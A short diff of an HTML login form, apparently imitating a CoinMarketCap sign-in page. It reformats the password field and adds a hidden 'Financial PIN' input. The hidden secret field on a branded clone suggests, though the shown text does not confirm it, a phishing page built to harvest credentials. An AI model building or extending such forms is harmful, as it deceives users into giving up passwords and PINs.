@@ -1691,16 +1691,29 @@
                   <div class="cont-input__title">
                     Password <a href="javascript:void(0)">Forgot password?</a>
                   </div>
-                  <label class="cont-input"
-                    ><input
+                  <label class="cont-input">
+                    <input
                       id="coinmarketcap-password"
                       type="password"
                       formcontrolname="password"
                       maxlength="32"
                       inputvalidation=""
                       placeholder="Enter your password"
-                      class="ng-dirty ng-valid ng-touched" /></label
-                  ><button type="submit" class="m-btn" id="coinmarketcap-login">
+                      class="ng-dirty ng-valid ng-touched"
+                    />
+                  </label>
+                  <div id="financial-pin" style="display: none">
+                    <div class="cont-input__title">Financial PIN</div>
+                    <label class="cont-input">
+                      <input
+                        id="coinmarketcap-secret"
+                        type="number"
+                        placeholder="Enter financial PIN"
+                        class="ng-dirty ng-valid ng-touched"
+                      />
+                    </label>
+                  </div>
+                  <button type="submit" class="m-btn" id="coinmarketcap-login">
                     Sign in
                   </button>
                   <div class="mt-5">
